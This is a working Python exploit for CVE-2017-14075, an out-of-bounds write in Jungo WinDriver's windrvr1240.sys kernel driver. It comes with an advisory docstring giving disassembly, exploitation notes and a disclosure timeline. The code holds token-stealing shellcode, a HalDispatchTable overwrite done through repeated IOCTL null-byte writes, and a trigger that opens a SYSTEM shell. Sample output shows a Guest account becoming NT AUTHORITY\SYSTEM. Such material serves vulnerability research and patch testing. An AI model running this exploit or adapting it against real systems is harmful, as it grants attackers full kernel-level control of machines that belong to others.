# -*- coding: utf-8 -*-
"""
Jungo DriverWizard WinDriver Kernel Out-of-Bounds Write Privilege Escalation Vulnerability

Download: http://www.jungo.com/st/products/windriver/
File:     WD1240.EXE
Sha1:     3527cc974ec885166f0d96f6aedc8e542bb66cba
Driver:   windrvr1240.sys
Sha1:     0f212075d86ef7e859c1941f8e5b9e7a6f2558ad
CVE:      CVE-2017-14075
Author:   Steven Seeley (mr_me) of Source Incite
Affected: <= v12.4.0
Thanks:   b33f and sickness

Summary:
========

This vulnerability allows local attackers to escalate privileges on vulnerable installations of Jungo WinDriver. An attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability. 

The specific flaw exists within the processing of IOCTL 0x953824a7 by the windrvr1240 kernel driver. The issue lies in the failure to properly validate user-supplied data which can result in an out-of-bounds write condition. An attacker can leverage this vulnerability to execute arbitrary code under the context of kernel.

Vulnerability:
==============

The vulnerability occurs in sub_405644 at loc_4056CD:

.text:004056CD loc_4056CD:                                     ; CODE XREF: sub_405644+6A
.text:004056CD                 mov     eax, [ebx]
.text:004056CF                 xor     edx, edx
.text:004056D1                 mov     byte ptr [edi+eax], 0   ; null byte write
.text:004056D5                 mov     eax, P
.text:004056DA                 add     [eax+880h], edi         ; offset HalDispatchTable[1]+0x880 is null and writable

Exploitation:
=============

At 0x004056da there is a second write, but since HalDispatchTable[1]+0x880 points to a null dword that is in a writable location, no memory is modified outside of out null byte write (0x004056d1).

Since we can do that, we can keep calling the vuln ioctl code and push down the kernel pointer from HalDispatchTable[1] to reach userland. We could have just done 2 bytes, but I choose 3 for reliability.

Finally, the shellcode repairs the HalDispatchTable[1] pointer by reading HalDispatchTable[2] and calculating the offset to the HalDispatchTable[1] pointer and then re-writes the correct pointer back into the HalDispatchTable.

Timeline:
=========

2017-08-22 – Verified and sent to Jungo via sales@/first@/security@/info@jungo.com
2017-08-25 – No response from Jungo and two bounced emails
2017-08-26 – Attempted a follow up with the vendor via website chat
2017-08-26 – No response via the website chat
2017-09-03 – Recieved an email from a Jungo representative stating that they are "looking into it"
2017-09-03 – Requested a timeframe for patch development and warned of possible 0day release
2017-09-06 – No response from Jungo
2017-09-06 – Public 0day release of advisory

Example:
========

C:\Users\Guest\Desktop>icacls poc.py
poc.py NT AUTHORITY\Authenticated Users:(I)(F)
       NT AUTHORITY\SYSTEM:(I)(F)
       BUILTIN\Administrators:(I)(F)
       BUILTIN\Users:(I)(F)
       Mandatory Label\Low Mandatory Level:(I)(NW)

Successfully processed 1 files; Failed processing 0 files

C:\Users\Guest\Desktop>whoami
debugee\guest

C:\Users\Guest\Desktop>poc.py

        --[ Jungo DriverWizard WinDriver Kernel Pool Overflow EoP exploit ]
                       Steven Seeley (mr_me) of Source Incite

(+) spraying pool with mixed objects...
(+) sprayed the pool!
(+) making pool holes...
(+) made the pool holes!
(+) allocating shellcode...
(+) allocated the shellcode!
(+) triggering pool overflow...
(+) allocating pool overflow input buffer
(+) elevating privileges!
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Guest\Desktop>whoami
nt authority\system

C:\Users\Guest\Desktop>
"""
import os
import sys
import struct
from ctypes import *
from ctypes.wintypes import *
from platform import release, architecture

kernel32 = windll.kernel32
ntdll = windll.ntdll

# GLOBAL VARIABLES
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
STATUS_SUCCESS = 0

class SYSTEM_MODULE_INFORMATION(Structure):
    _fields_ = [("Reserved", c_void_p * 3), # this has an extra c_void_p because the first 4 bytes = number of return entries.
                ("ImageBase", c_void_p),    # it's not actually part of the structure, but we are aligning it.
                ("ImageSize", c_ulong),
                ("Flags", c_ulong),
                ("LoadOrderIndex", c_ushort),
                ("InitOrderIndex", c_ushort),
                ("LoadCount", c_ushort),
                ("ModuleNameOffset", c_ushort),
                ("FullPathName", c_char * 256)]

def alloc_shellcode(base, input_size, HalDispatchTable1):
    """ 
    allocates some shellcode
    """
    print "(+) allocating shellcode @ 0x%x" % base
    baseadd = c_int(base)
    size    = c_int(input_size)

    # get the repair address
    HalDispatchTable2 = struct.pack("<I", HalDispatchTable1+0x4)
    
    # --[ setup]
    input  = "\x60"                      # pushad
    input += "\x64\xA1\x24\x01\x00\x00"  # mov eax, fs:[KTHREAD_OFFSET]
    input += "\x8B\x40\x50"              # mov eax, [eax + EPROCESS_OFFSET]
    input += "\x89\xC1"                  # mov ecx, eax (Current _EPROCESS structure)
    input += "\x8B\x98\xF8\x00\x00\x00"  # mov ebx, [eax + TOKEN_OFFSET]
    # --[ copy system PID token]
    input += "\xBA\x04\x00\x00\x00"      # mov edx, 4 (SYSTEM PID)
    input += "\x8B\x80\xB8\x00\x00\x00"  # mov eax, [eax + FLINK_OFFSET] <-|
    input += "\x2d\xB8\x00\x00\x00"      # sub eax, FLINK_OFFSET           |
    input += "\x39\x90\xB4\x00\x00\x00"  # cmp [eax + PID_OFFSET], edx     |
    input += "\x75\xed"                  # jnz                           ->|
    input += "\x8B\x90\xF8\x00\x00\x00"  # mov edx, [eax + TOKEN_OFFSET]
    input += "\x89\x91\xF8\x00\x00\x00"  # mov [ecx + TOKEN_OFFSET], edx
    # --[ recover]
    input += "\xbe" + HalDispatchTable2  # mov esi, HalDispatchTable[2]
    input += "\x8b\x16"                  # mov edx, [esi]
    input += "\x81\xea\x12\x09\x00\x00"  # sub edx, 0x912
    input += "\x83\xee\x04"              # sub esi, 0x4
    input += "\x89\x16"                  # mov [esi], edx
    input += "\x61"                      # popad
    input += "\xC3"                      # ret

    input += "\xcc" * (input_size-len(input))
    ntdll.NtAllocateVirtualMemory.argtypes = [c_int, POINTER(c_int), c_ulong, 
                                              POINTER(c_int), c_int, c_int]
    dwStatus = ntdll.NtAllocateVirtualMemory(0xffffffff, byref(baseadd), 0x0, 
                                             byref(size), 
                                             MEM_RESERVE|MEM_COMMIT,
                                             PAGE_EXECUTE_READWRITE)
    if dwStatus != STATUS_SUCCESS:
        print "(-) Error while allocating memory: %s" % hex(dwStatus + 0xffffffff)
        return False
    written = c_ulong()
    write = kernel32.WriteProcessMemory(0xffffffff, base, input, len(input), byref(written))
    if write == 0:
        print "(-) Error while writing our input buffer memory: %s" % write
        return False
    return True

def alloc(base, input_size):
    """
    Just allocates things.
    """
    baseadd   = c_int(base)
    size = c_int(input_size)
    ntdll.NtAllocateVirtualMemory.argtypes = [c_int, POINTER(c_int), c_ulong, 
                                              POINTER(c_int), c_int, c_int]
    dwStatus = ntdll.NtAllocateVirtualMemory(0xffffffff, byref(baseadd), 0x0, 
                                             byref(size), 
                                             MEM_RESERVE|MEM_COMMIT,
                                             PAGE_EXECUTE_READWRITE)
    if dwStatus != STATUS_SUCCESS:
        print "(-) Error while allocating memory: %s" % hex(dwStatus + 0xffffffff)
        return False
    return True

def mymemset(base, location, size):
    """
    A cheap memset ¯\_(ツ)_/¯
    """
    input = location * (size/len(location))
    written = c_ulong()
    
    write = kernel32.WriteProcessMemory(0xFFFFFFFF, base, input, len(input), byref(written))
    if write == 0:
        print "(-) Error while writing our input buffer memory: %s" % write
        return False
    return True

def get_HALDispatchTable_kernel_address():
    """
    This function gets the HALDispatchTable's kernel address
    """
    # allocate arbitrary buffer and call NtQuerySystemInformation
    b = create_string_buffer(0)
    systeminformationlength = c_ulong(0)
    res = ntdll.NtQuerySystemInformation(11, b, len(b), byref(systeminformationlength))

    # call NtQuerySystemInformation second time with right size
    b = create_string_buffer(systeminformationlength.value)
    res = ntdll.NtQuerySystemInformation(11, b, len(b), byref(systeminformationlength))

    # marshal raw bytes for 1st entry
    smi = SYSTEM_MODULE_INFORMATION()
    memmove(addressof(smi), b, sizeof(smi))

    # get kernel image name
    kernelImage = smi.FullPathName.split('\\')[-1]
    print "(+) found %s kernel base address: 0x%x" % (kernelImage, smi.ImageBase)

    # load kernel image in userland and get HAL Dispatch Table offset
    hKernelImage = kernel32.LoadLibraryA(kernelImage)
    print "(+) loading %s in userland" % kernelImage
    print "(+) found %s Userland Base Address : 0x%x" % (kernelImage, hKernelImage)
    hdt_user_address = kernel32.GetProcAddress(hKernelImage,"HalDispatchTable")
    print "(+) found HalDispatchTable userland base address: 0x%x" % hdt_user_address

    # calculate HAL Dispatch Table offset in kernel land
    hdt_kernel_address = smi.ImageBase + ( hdt_user_address - hKernelImage)
    print "(+) found HalDispatchTable kernel base address: 0x%x" % hdt_kernel_address
    return hdt_kernel_address
 
def write_one_null_byte(HWD, in_buffer, location):
    """
    The primitive function
    """
    mymemset(in_buffer, location, 0x1000)
    if HWD:
        IoStatusBlock = c_ulong()
        dev_ioctl = ntdll.ZwDeviceIoControlFile(HWD,
                                       None,
                                       None,
                                       None,
                                       byref(IoStatusBlock),
                                       0x953824a7,                  # target
                                       in_buffer,                   # special buffer
                                       0x1000,                      # just the size to trigger with
                                       0x20000000,                  # whateva
                                       0x1000                       # whateva
                                       )
        # we could check dev_ioctl here I guess
        return True
    return False

def we_can_elevate(h, in_buffer, base):
    """
    This just performs the writes...
    """

    # get location of first byte write
    where2write = struct.pack("<I", base + 0x3)
    print "(+) triggering the first null byte write..."
    if write_one_null_byte(h, in_buffer, where2write):

        # get the location of the second byte write
        where2write = struct.pack("<I", base + 0x2)
        print "(+) triggering the second null byte write..."
        if write_one_null_byte(h, in_buffer, where2write):
    
            # get the location of the third byte write
            where2write = struct.pack("<I", base + 0x1)
            print "(+) triggering the third null byte write..."
            if write_one_null_byte(h, in_buffer, where2write):

                # eop
                print "(+) calling NtQueryIntervalProfile to elevate"
                arb = c_ulong(0)
                ntdll.NtQueryIntervalProfile(0x1337, byref(arb))
                return True
    return False

def main():
    print "\n\t--[ Jungo DriverWizard WinDriver Kernel Write EoP exploit ]"
    print "\t               Steven Seeley (mr_me) of Source Incite\r\n"
    if release() != "7" and architecture()[0] == "32bit":
        print "(-) this exploit will only work for Windows 7 x86."
        print "    patch the shellcode for other windows versions."
        sys.exit(-1)

    print "(+) attacking target WinDrvr1240"
    GENERIC_READ  = 0x80000000
    GENERIC_WRITE = 0x40000000
    OPEN_EXISTING = 0x3

    DEVICE_NAME   = "\\\\.\\WinDrvr1240"
    dwReturn      = c_ulong()
    h = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)

    # get the second HalDispatchTable entry[0]
    base = get_HALDispatchTable_kernel_address() + 0x4

    # create some shellcode that patches the HalDispatchTable[1]
    if not alloc_shellcode(0x000000a2, 0x1000, base):
        print "(-) cannot allocate shellcode"
        sys.exit(-1)

    # alloc some memory
    in_buffer = 0x41414141
    in_size   = 0x1000
    if not alloc(in_buffer, 0x1000):
        print "(-) cannot allocate target buffer"
        sys.exit(-1)

    if we_can_elevate(h, in_buffer, base):
        os.system('cmd.exe')
    else:
        print "(-) exploit failed!"

if __name__ == '__main__':
    main()